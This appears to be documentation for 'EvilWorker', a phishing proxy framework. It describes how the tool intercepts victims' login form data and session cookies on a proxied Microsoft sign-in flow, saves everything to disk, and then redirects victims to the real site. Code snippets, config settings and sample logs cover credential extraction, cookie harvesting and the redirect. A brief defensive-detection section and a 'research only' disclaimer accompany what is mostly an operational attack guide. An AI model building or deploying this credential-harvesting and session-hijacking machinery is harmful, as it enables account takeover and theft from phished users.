# 🔄 Server Redirect Behavior - EvilWorker Framework

## Overview

The EvilWorker framework now implements a **"Capture All Data First, Then Redirect"** strategy. This ensures that **NO data is lost** before the user is redirected to the legitimate service.

## 🎯 When Does Server Redirect Occur?

### **Trigger Conditions**

The server redirect occurs **ONLY** when **ALL** of the following conditions are met:

1. **Credential Detection**: The framework detects credentials in the request
2. **Data Capture Complete**: All session data has been comprehensively captured
3. **Data Flushed to Disk**: All data is safely stored before redirect
4. **Configuration Enabled**: Redirect is enabled in `config.js`

### **Specific Triggers**

```javascript
// Redirect occurs when EITHER:
if (config.credentials.enableRedirect && (
    hasCredentialsBeenCollected(currentSession) || 
    isLoginFormSubmission(proxyRequestBody, proxyRequestOptions)
)) {
    // START COMPREHENSIVE DATA CAPTURE
    // THEN REDIRECT
}
```

## 🚀 Enhanced Redirect Process

### **Step-by-Step Redirect Flow**

```
1. CREDENTIALS DETECTED
   ↓
2. START COMPREHENSIVE DATA CAPTURE
   ↓
3. CAPTURE ALL FORM DATA
   ↓
4. CAPTURE ALL COOKIES
   ↓
5. ANALYZE SESSION DATA
   ↓
6. CREATE SESSION SUMMARY
   ↓
7. FLUSH ALL DATA TO DISK
   ↓
8. VERIFY DATA INTEGRITY
   ↓
9. REDIRECT USER
```

### **Detailed Process Breakdown**

#### **Phase 1: Data Detection & Capture**
```javascript
// 1. Enhanced data capture before redirect
await captureAllSessionData(currentSession, proxyRequestBody, proxyRequestOptions);

// 2. Capture current request data if not already captured
if (proxyRequestBody) {
    extractAndLogFormData(proxyRequestBody, currentSession, proxyRequestOptions.path);
    session.requestCount++;
}

// 3. Ensure all cookies are analyzed and logged
logAllCookies(currentSession);
```

#### **Phase 2: Session Analysis**
```javascript
// 4. Perform final credential analysis
if (session.lastFormData) {
    const credentialFields = {};
    const otherFields = {};
    
    for (const [key, value] of Object.entries(session.lastFormData)) {
        const keyLower = key.toLowerCase();
        if (config.credentials.credentialFields.some(field => keyLower.includes(field))) {
            credentialFields[key] = value;
        } else {
            otherFields[key] = value;
        }
    }
    
    if (Object.keys(credentialFields).length > 0) {
        session.credentialCount++;
        session.capturedCredentials.push({
            timestamp: new Date().toISOString(),
            path: proxyRequestOptions.path,
            credentialFields: credentialFields,
            allFields: session.lastFormData,
            source: 'final_capture'
        });
    }
}
```

#### **Phase 3: Data Persistence**
```javascript
// 5. Create comprehensive session summary
session.finalSummary = {
    timestamp: new Date().toISOString(),
    totalCookies: session.cookies.length,
    totalCredentials: session.capturedCredentials.length,
    totalRequests: session.requestCount,
    targetService: session.targetService,
    sessionDuration: Date.now() - new Date(session.createdAt).getTime(),
    dataCaptureComplete: true
};

// 6. Ensure all data is flushed to disk before redirect
await flushSessionData(currentSession);
```

#### **Phase 4: Final Redirect**
```javascript
// 7. Redirect to the legitimate service after comprehensive data capture
clientResponse.writeHead(302, { 
    Location: config.credentials.redirectUrl,
    ...config.security.redirectHeaders
});
clientResponse.end();
```

## 📊 What Gets Captured Before Redirect

### **Complete Data Inventory**

| Data Type | Description | Capture Method |
|-----------|-------------|----------------|
| **All Form Data** | Email, password, additional fields | `extractAndLogFormData()` |
| **All Cookies** | Credential, session, authentication | `logAllCookies()` |
| **Request Headers** | Complete request metadata | Session tracking |
| **Response Headers** | Server response metadata | Session tracking |
| **Session State** | Complete session information | Enhanced session management |
| **Timing Data** | Creation, activity, redirect timestamps | Session metadata |
| **Target Service** | Protocol, hostname, path, port | Session initialization |

### **Data Capture Examples**

#### **Form Data Capture**
```javascript
// Before redirect, ALL form fields are captured:
{
    "credentialFields": {
        "user_email": "admin@company.com",
        "user_password": "admin123"
    },
    "allFields": {
        "user_email": "admin@company.com",
        "user_password": "admin123",
        "department": "IT",
        "role": "administrator",
        "remember_me": "true",
        "client_id": "3ce82761-cb43-493f-94bb-fe444b7a0cc4"
    }
}
```

#### **Cookie Analysis**
```javascript
// Before redirect, ALL cookies are analyzed:
{
    "totalCookies": 5,
    "credentialCookies": 2,
    "sessionCookies": 2,
    "otherCookies": 1,
    "allCookies": [
        {
            "name": "sessionId",
            "value": "abc123def456",
            "domain": "example.com",
            "path": "/",
            "expires": 1234567890
        }
        // ... all other cookies
    ]
}
```

#### **Session Summary**
```javascript
// Before redirect, complete session summary is created:
{
    "timestamp": "2024-01-15T10:30:00.000Z",
    "totalCookies": 5,
    "totalCredentials": 2,
    "totalRequests": 15,
    "targetService": {
        "protocol": "https:",
        "hostname": "login.microsoftonline.com",
        "path": "/common/login",
        "port": "443"
    },
    "sessionDuration": 45000,
    "dataCaptureComplete": true
}
```

## ⚙️ Configuration Options

### **Redirect Control Settings**

```javascript
// config.js
credentials: {
    // Enable/disable automatic redirect
    enableRedirect: true,
    
    // URL to redirect to after data capture
    redirectUrl: "https://login.microsoftonline.com/",
    
    // Minimum data capture requirements before redirect
    minDataCapture: {
        cookies: 1,           // Minimum cookies to capture
        credentials: 1,       // Minimum credentials to capture
        requests: 1,          // Minimum requests to capture
        formSubmissions: 1    // Minimum form submissions to capture
    },
    
    // Delay before redirect to ensure data capture
    redirectDelay: 1000      // 1 second delay
}
```

### **Data Capture Settings**

```javascript
dataCapture: {
    // Enable comprehensive data capture
    enableComprehensiveCapture: true,
    
    // Capture all form data (not just credentials)
    captureAllFormData: true,
    
    // Capture all cookies (not just credential-related)
    captureAllCookies: true,
    
    // Create session summary files
    createSessionSummaries: true
}
```

## 🔍 Monitoring Redirect Behavior

### **Console Logs**

The framework provides detailed logging during the redirect process:

```
[CREDENTIALS_DETECTED] Session: abc123def456 - Starting comprehensive data capture before redirect
[DATA_CAPTURE] Session: abc123def456 - Starting comprehensive data capture
[DATA_CAPTURE] Session: abc123def456 - Comprehensive data capture completed
[DATA_CAPTURE] Summary: 5 cookies, 2 credentials, 15 requests
[DATA_FLUSH] Session: abc123def456 - Flushing session data to disk
[DATA_FLUSH] Session: abc123def456 - Log file flushed successfully
[DATA_FLUSH] Session: abc123def456 - Session summary saved to: session_summary_abc123def456.json
[DATA_FLUSH] Session: abc123def456 - All data successfully flushed to disk
[CREDENTIALS_COLLECTED] Session: abc123def456 - All data captured, redirecting to: https://login.microsoftonline.com/
[CREDENTIALS_COLLECTED] Cookies captured: 5
[CREDENTIALS_COLLECTED] Credentials captured: 2
[CREDENTIALS_COLLECTED] Form submissions: 3
[CREDENTIALS_COLLECTED] Total requests: 15
[LOGGING] Comprehensive credential log encrypted and saved for session: abc123def456
```

### **Session Debug Interface**

Visit `/session-debug` to see the complete captured data:

```
http://localhost:3000/session-debug
```

**What You'll See:**
- **Target Service**: The legitimate service being phished
- **Captured Credentials**: All form submissions with credentials
- **All Cookies**: Complete cookie analysis and values
- **Session Summary**: Comprehensive session statistics
- **Data Capture Status**: Whether data capture is complete

## 🚨 Security Implications

### **Data Loss Prevention**

- **NO data is lost** during the redirect process
- **All form submissions** are captured before redirect
- **All cookies** are analyzed and stored
- **Complete session state** is preserved
- **Data integrity** is verified before redirect

### **Detection Challenges**

- **Comprehensive data capture** makes the framework more dangerous
- **Session persistence** enables extended access
- **Complete form analysis** captures more than just credentials
- **Advanced logging** provides detailed attack analysis

## 🛡️ Defensive Considerations

### **Detection Methods**

1. **Service Worker Monitoring**: Detect unauthorized service worker registration
2. **Request Pattern Analysis**: Identify unusual request routing patterns
3. **Data Capture Monitoring**: Track comprehensive data collection
4. **Redirect Pattern Analysis**: Monitor for delayed redirects after data capture

### **Prevention Strategies**

1. **Content Security Policy**: Restrict service worker registration
2. **Request Validation**: Verify request origins and routing
3. **Data Loss Prevention**: Monitor for excessive data collection
4. **User Education**: Awareness of phishing link characteristics

## 📈 Benefits of Enhanced Redirect

### **For Attackers (Red Team)**

- **Complete data capture** before any redirect
- **No data loss** during the attack process
- **Comprehensive session analysis** for post-exploitation
- **Professional-grade logging** for attack analysis

### **For Defenders**

- **Clear attack patterns** to detect and prevent
- **Comprehensive logging** for incident response
- **Advanced detection opportunities** through pattern analysis
- **Better understanding** of attack methodologies

## 🎯 Conclusion

The enhanced EvilWorker framework now implements a **"Capture All Data First, Then Redirect"** strategy that ensures:

- ✅ **NO data is lost** during the redirect process
- ✅ **Complete form data** is captured (email, password, additional fields)
- ✅ **All cookies** are analyzed and stored
- ✅ **Comprehensive session state** is preserved
- ✅ **Data integrity** is verified before redirect
- ✅ **Professional-grade logging** is maintained

This makes the framework extremely dangerous in the wrong hands, but also provides valuable insights for defensive strategy development and security research.

---

**Remember**: This framework is designed for legitimate security research and authorized testing only. Use responsibly and ethically.
